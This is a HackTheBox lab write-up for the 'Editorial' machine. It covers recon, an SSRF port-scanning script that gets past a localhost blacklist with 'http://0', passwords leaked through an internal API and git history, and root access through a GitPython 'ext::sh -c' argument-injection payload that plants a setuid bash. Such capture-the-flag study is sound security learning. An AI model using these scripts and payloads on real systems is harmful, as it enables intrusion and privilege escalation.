---
title: HackTheBox - Editorial
date: Fri Aug 16 12:47:08 AM EDT 2024
categories: [PentestNotes]
tags: [linux,dns,ssrf,git,htb,htb_season_5]
---

## Recon

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.20:22
Open 10.10.11.20:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.10.11.20
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-16 20:06 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:07
Completed Parallel DNS resolution of 1 host. at 20:07, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:07
Scanning 10.10.11.20 [2 ports]
Discovered open port 80/tcp on 10.10.11.20
Discovered open port 22/tcp on 10.10.11.20
Completed Connect Scan at 20:07, 0.17s elapsed (2 total ports)
Initiating Service scan at 20:07
Scanning 2 services on 10.10.11.20
Completed Service scan at 20:07, 6.31s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.20.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 10.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.90s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Nmap scan report for 10.10.11.20
Host is up, received user-set (0.096s latency).
Scanned at 2024-06-16 20:07:03 UTC for 19s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:07
Completed NSE at 20:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.02 seconds
```
</details>

{::options parse_block_html="false" /}

```bash
└─$ grep 'edit' /etc/hosts
10.10.11.20     editorial.htb
```

## HTTP (80)

It about page we have another subdomain `Contact us: submissions@tiempoarriba.htb`, but it leads to same domain.

![Writeup.png](/assets/images/Season 5/Editorial/Writeup.png)

There's also upload

![Writeup-1.png](/assets/images/Season 5/Editorial/Writeup-1.png)

The cover image is not in form body, `Priview` button displays the image and it also creates it if uploaded.

![Writeup-2.png](/assets/images/Season 5/Editorial/Writeup-2.png)

The server also makes request to us, which indicates possible LFI/RFI or SSRF.
```bash
└─$ serve 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.11.20 - - [16/Jun/2024 16:32:26] "GET /test HTTP/1.1" 200 -
```
### SSRF

```python
import aiohttp
import asyncio

URL = 'http://editorial.htb/upload-cover'
FAILURE = '/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg'

async def fetch(session, port):
    url = f'http://0:{port}'
    payload = aiohttp.FormData()
    payload.add_field('bookurl', url)
    payload.add_field('bookfile', b'', content_type='application/octet-stream')
    async with session.post(URL, data=payload) as resp:
        text = await resp.text() 
        if text == FAILURE:
            print(f'[{port}] {url} Invalid')
        else:
            print(f'[{port}] {url} Valid')

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(3000, 2**16):
            tasks.append(fetch(session, i))
            if len(tasks) >= 100: # Send as batch
                await asyncio.gather(*tasks)
                tasks = []
                
        if tasks: # Leftover
            await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
```

```bash
└─$ py ssrf.py -u | tee ssrf.log

└─$ head -1 ssrf.log 
[3003] http://0:3003 Invalid

└─$ tail -1 ssrf.log
[14547] http://0:14547 Invalid

└─$ grep Valid ssrf.log  
[5000] http://0:5000 Valid
```

For easy box probably no port will be open above 10000 (or near to that value) so I stopped.

```python
import json
import requests

class Routes:
    BASE = 'http://editorial.htb'
    COVER = BASE + '/upload-cover'

url = 'http://0:5000'
payload = {
    "bookurl": (None, url),
    "bookfile": ('', b'', 'application/octet-stream')
}
resp = requests.post(Routes.COVER, files=payload) 
resp = requests.get(f'{Routes.BASE}/{resp.text}')
print(json.dumps(resp.json(), indent=2))
```

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Script is more like plug and play rather then interactive.

URL: `url = 'http://0:5000/api/latest/metadata/changelog'`
```json
  {
    "1": {
      "api_route": "/api/v1/metadata/",
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Editorial El Tiempo Por Arriba"
    }
  },
  {
    "1.1": {
      "api_route": "/api/v1.1/metadata/",
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Ed Tiempo Arriba"
    }
  },
  {
    "1.2": {
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Editorial Tiempo Arriba",
      "endpoint": "/api/v1.2/metadata/"
    }
  },
  {
    "2": {
      "contact_email": "info@tiempoarriba.moc.oc",
      "editorial": "Editorial Tiempo Arriba",
      "endpoint": "/api/v2/metadata/"
    }
  }
]
```

### Leaked Credentials

URL: `url = 'http://0:5000/api/latest/metadata/messages/authors'`
```json
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

> Creds: `dev:dev080217_devAPI!@`
{: .prompt-tip }

## SSH

## User.txt

```bash
dev@editorial:~$ cat user.txt
6c29d0eb193182cb317f0fe4a0bce484
```

## Privilege Escalation (prod)

```bash
dev@editorial:~/apps$ ls -alh
total 12K
drwxrwxr-x 3 dev dev 4.0K Jun  5 14:36 .
drwxr-x--- 4 dev dev 4.0K Jun 17 05:45 ..
drwxr-xr-x 8 dev dev 4.0K Jun  5 14:36 .git
dev@editorial:~/apps$ git checkout .
Updated 52 paths from the index
dev@editorial:~/apps/app_editorial$ vim app.py
...
# -------------------------------
# Program functions
# -------------------------------
# -- Reject internal requests
def request_reject_localhost(url_bookcover):
    reject_url = ["localhost", "127.0.0.1"]
    for i in reject_url:
        if i in url_bookcover.lower():
            return True
...
```

Totally unintentional usage of `http://0` for localhost, because its short and I'm lazy, lol. But looks like there was localhost blacklist!

Nothing in the app in current state, check commits:

```bash
dev@editorial:~/apps$ git log --oneline
8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

Prod is interesting, check what changed:

```bash
dev@editorial:~/apps$ git show b73481b
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev

    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass

 # -------------------------------
```

`prod` is another user on system:
```bash
dev@editorial:~/apps$ ls /home
dev  prod
dev@editorial:~/apps$ su - prod
```

> Creds: `prod:080217_Producti0n_2023!@`
{: .prompt-tip }

## Privilege Escalation (root)

```bash
prod@editorial:~$ sudo -l
[sudo] password for prod:
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

```bash
prod@editorial:/opt/internal_apps/clone_changes$ ls
branches  clone_prod_change.py  config  description  HEAD  hooks  info  objects  refs
prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

The script is vulnerable to [CVE-2022-24439](https://www.cve.org/CVERecord?id=CVE-2022-24439) [Remote Code Execution (RCE)](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c touch% /tmp/pwned"
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:/opt/internal_apps/clone_changes$ ls /tmp/pwned -l
-rw-r--r-- 1 root root 33 Jun 17 06:56 /tmp/pwned
```

We get an error, but the command was executed.

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c cp% /bin/bash% /tmp/rootbash% &&% chmod% 4777% /tmp/rootbash"
prod@editorial:/opt/internal_apps/clone_changes$ ls /tmp
pwned   rootbash  
prod@editorial:/opt/internal_apps/clone_changes$ /tmp/rootbash -p
rootbash-5.1# rm /tmp/rootbash # For HTB Players
rootbash-5.1# cd /root
rootbash-5.1# cat root.txt
39d0f7ef01ec2921afaeee69dc7f96a6
```

> Note: The exploit requires percentages after each "word" ends.
{: .prompt-info }
